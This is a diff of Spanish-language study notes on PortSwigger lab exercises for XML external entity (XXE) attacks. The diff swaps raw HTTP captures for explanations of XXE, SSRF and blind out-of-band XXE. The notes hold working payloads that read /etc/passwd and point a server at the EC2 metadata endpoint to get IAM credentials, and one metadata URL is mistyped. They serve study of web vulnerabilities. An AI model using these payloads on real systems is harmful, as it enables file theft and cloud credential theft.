@@ -5,29 +5,15 @@ eduardo.lazaro@heuristica-ti.com.mx
 ---
 # Lab 1 : Exploiting XXE external entities to retrieve files
 
-Este laboratorio tiene una característica de "Comprobar existencias" que analiza la entrada XML y devuelve cualquier valor inesperado en la respuesta. Para resolver el laboratorio, inyecte una entidad externa XML para recuperar el contenido del archivo /etc/passwd.
+En esencia, XML External Entity (Entidad Externa XML) es una característica legítima en XML que permite a un documento XML hacer referencia a entidades definidas en un lugar externo, como archivos, bases de datos o incluso recursos de red. Sin embargo, si esta característica no se maneja correctamente, puede dar lugar a ataques de inyección de entidades externas que permiten a un atacante acceder a archivos en el servidor.
+
+El ataque XXE que se menciona específicamente en tu pregunta implica manipular una entrada XML en una aplicación web para que haga referencia a un archivo en el sistema de archivos del servidor y luego se aproveche para leer su contenido. Por ejemplo, un atacante podría crear un archivo XML malicioso que contiene una referencia a un archivo sensible en el servidor, y luego enviar este archivo XML a la aplicación web. Si la aplicación no valida adecuadamente las entidades externas y procesa el archivo XML de manera insegura, el atacante podría recuperar el contenido del archivo deseado y potencialmente obtener información confidencial.
+
+==Este laboratorio tiene una característica de "Comprobar existencias" que analiza la entrada XML y devuelve cualquier valor inesperado en la respuesta. Para resolver el laboratorio, inyecte una entidad externa XML para recuperar el contenido del archivo /etc/passwd.==
 
 ![[Pasted image 20230814115018.png|]]
 
-```
-POST /product/stock HTTP/2
-Host: 0a5e005b047c4a7f839eb52500a40035.web-security-academy.net
-Cookie: session=eKUxopFI8gCrE9jZ3wmXyq8KSuRgRP8B
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
-Accept: */*
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Referer: https://0a5e005b047c4a7f839eb52500a40035.web-security-academy.net/product?productId=2
-Content-Type: application/xml
-Content-Length: 107
-Origin: https://0a5e005b047c4a7f839eb52500a40035.web-security-academy.net
-Sec-Fetch-Dest: empty
-Sec-Fetch-Mode: cors
-Sec-Fetch-Site: same-origin
-Dnt: 1
-Sec-Gpc: 1
-Te: trailers
-
+```java
 <?xml version="1.0" encoding="UTF-8"?>
 <stockCheck>
 <productId>
@@ -38,28 +24,11 @@ Te: trailers
 </storeId>
 </stockCheck>
 ```
+==El fragmento de código XML es un ejemplo de un documento XML. XML (Extensible Markup Language) es un lenguaje de marcado utilizado para estructurar y almacenar datos en un formato legible tanto para humanos como para máquinas.un fragmento de datos relacionados con la verificación de stock de un producto en una tienda.
 
 ![[Pasted image 20230814121015.png|1000]]
 
-```
-POST /product/stock HTTP/2
-Host: 0a5e005b047c4a7f839eb52500a40035.web-security-academy.net
-Cookie: session=eKUxopFI8gCrE9jZ3wmXyq8KSuRgRP8B
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
-Accept: */*
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Referer: https://0a5e005b047c4a7f839eb52500a40035.web-security-academy.net/product?productId=2
-Content-Type: application/xml
-Content-Length: 173
-Origin: https://0a5e005b047c4a7f839eb52500a40035.web-security-academy.net
-Sec-Fetch-Dest: empty
-Sec-Fetch-Mode: cors
-Sec-Fetch-Site: same-origin
-Dnt: 1
-Sec-Gpc: 1
-Te: trailers
-
+```java 
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
 <stockCheck>
@@ -74,32 +43,18 @@ Te: trailers
 ---
 # Lab 2 : Exploiting XXE to perform SSRF attacks
 
-Este laboratorio tiene una característica de "Comprobar existencias" que analiza la entrada XML y devuelve cualquier valor inesperado en la respuesta. 
+1. **XXE (XML External Entity)**: Como se mencionó anteriormente, XXE es una vulnerabilidad que permite a un atacante insertar referencias a entidades externas en un documento XML que una aplicación procesa. Esto puede llevar a la exposición de archivos en el servidor o incluso a la realización de ataques más avanzados.
+    
+2. **SSRF (Server-Side Request Forgery)**: SSRF es una vulnerabilidad en la que un atacante engaña a una aplicación para que realice solicitudes a recursos en red, como servidores internos o externos, en nombre del servidor donde se encuentra la aplicación. Esto puede permitir al atacante acceder a recursos a los que normalmente no tendría acceso o realizar ataques a otros sistemas internos.
+
+==Este laboratorio tiene una característica de "Comprobar existencias" que analiza la entrada XML y devuelve cualquier valor inesperado en la respuesta. 
 El servidor de laboratorio ejecuta un punto final de metadatos EC2 (simulado) en la URL predeterminada, que es http://169.254.169.254/. 
 Este punto final se puede usar para recuperar datos sobre la instancia, algunos de los cuales pueden ser confidenciales. 
-Para resolver el laboratorio, aproveche la vulnerabilidad XXE para realizar un ataque SSRF que obtenga la clave de acceso secreta de IAM del servidor desde el extremo de metadatos de EC2.
+Para resolver el laboratorio, aproveche la vulnerabilidad XXE para realizar un ataque SSRF que obtenga la clave de acceso secreta de IAM del servidor desde el extremo de metadatos de EC2.==
 
 ![[Pasted image 20230814124020.png|1000]]
 
-```
-POST /product/stock HTTP/2
-Host: 0a4300f30381a858844c05d100ba005e.web-security-academy.net
-Cookie: session=xHHQ5Bygw4W73yMvI9XBqwWZqN9aizAc
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
-Accept: */*
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Referer: https://0a4300f30381a858844c05d100ba005e.web-security-academy.net/product?productId=2
-Content-Type: application/xml
-Content-Length: 176
-Origin: https://0a4300f30381a858844c05d100ba005e.web-security-academy.net
-Sec-Fetch-Dest: empty
-Sec-Fetch-Mode: cors
-Sec-Fetch-Site: same-origin
-Dnt: 1
-Sec-Gpc: 1
-Te: trailers
-
+```java
 <?xml version="1.0" encoding="UTF-8"?>
 <stockCheck>
 <productId>
@@ -112,25 +67,7 @@ Te: trailers
 ```
 ![[Pasted image 20230814124522.png|1000]]
 
-```
-POST /product/stock HTTP/2
-Host: 0a4300f30381a858844c05d100ba005e.web-security-academy.net
-Cookie: session=xHHQ5Bygw4W73yMvI9XBqwWZqN9aizAc
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
-Accept: */*
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Referer: https://0a4300f30381a858844c05d100ba005e.web-security-academy.net/product?productId=2
-Content-Type: application/xml
-Content-Length: 180
-Origin: https://0a4300f30381a858844c05d100ba005e.web-security-academy.net
-Sec-Fetch-Dest: empty
-Sec-Fetch-Mode: cors
-Sec-Fetch-Site: same-origin
-Dnt: 1
-Sec-Gpc: 1
-Te: trailers
-
+```java
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
 <stockCheck>
@@ -146,11 +83,20 @@ Te: trailers
 
 ![[Pasted image 20230814125142.png]]
 
+```java
+http://169.254.169254/latest/meta-data/iam/security-credentials/admin
+```
 ---
 
 # Lab 3 : Blind XXE with out-of-band interaction via XML parameter entities
 
-Este laboratorio tiene una característica de "Comprobar existencias" que analiza la entrada XML, pero no muestra ningún valor inesperado y bloquea las solicitudes que contienen entidades externas regulares. Para resolver el laboratorio, use una entidad de parámetro para hacer que el analizador XML emita una búsqueda de DNS y una solicitud HTTP a Burp Collaborator.
+1. **Blind XXE (XXE Ciego)**: En un ataque de XXE ciego, el atacante inyecta entidades externas maliciosas en una aplicación web que procesa XML. Sin embargo, a diferencia de los ataques XXE tradicionales, en los cuales el atacante puede ver la respuesta del servidor en tiempo real, en un ataque ciego, el atacante no recibe una respuesta inmediata con la información explotada.
+    
+2. **Out-of-band Interaction (Interacción fuera de banda)**: En lugar de esperar una respuesta directa del servidor, el atacante configura el sistema para que realice interacciones con el servidor a través de canales de comunicación alternativos, como solicitudes HTTP, peticiones DNS o incluso servicios de terceros. Estos canales secundarios se utilizan para extraer la información que el atacante intenta obtener.
+    
+3. **XML Parameter Entities (Entidades de parámetros XML)**: Las entidades de parámetros son características de XML que permiten definir fragmentos de contenido para su reutilización dentro del mismo documento XML. En el contexto de un ataque XXE ciego, las entidades de parámetros se utilizan para generar solicitudes a través de canales fuera de banda. Esto permite al atacante recibir información indirectamente a través de estos canales, evitando la necesidad de una respuesta directa del servidor explotado.
+
+==Este laboratorio tiene una característica de "Comprobar existencias" que analiza la entrada XML, pero no muestra ningún valor inesperado y bloquea las solicitudes que contienen entidades externas regulares. Para resolver el laboratorio, use una entidad de parámetro para hacer que el analizador XML emita una búsqueda de DNS y una solicitud HTTP a Burp Collaborator.==
 
 ```java
 <?xml version="1.0" encoding="UTF-8"?>
@@ -168,7 +114,7 @@ Este laboratorio tiene una característica de "Comprobar existencias" que analiz
 ![[Pasted image 20230815164453.png]]
 
 ![[Pasted image 20230815164943.png]]
-
+La idea básica detrás de Burp Collaborator es que crea un punto de comunicación controlado por el atacante (a menudo un subdominio o un dominio que está bajo el control de PortSwigger) que se utiliza para rastrear las interacciones entre la aplicación objetivo y el servidor Collaborator. Aquí hay algunos escenarios donde el Collaborator puede ser útil
 ![[Pasted image 20230815164959.png]]
 
 ---
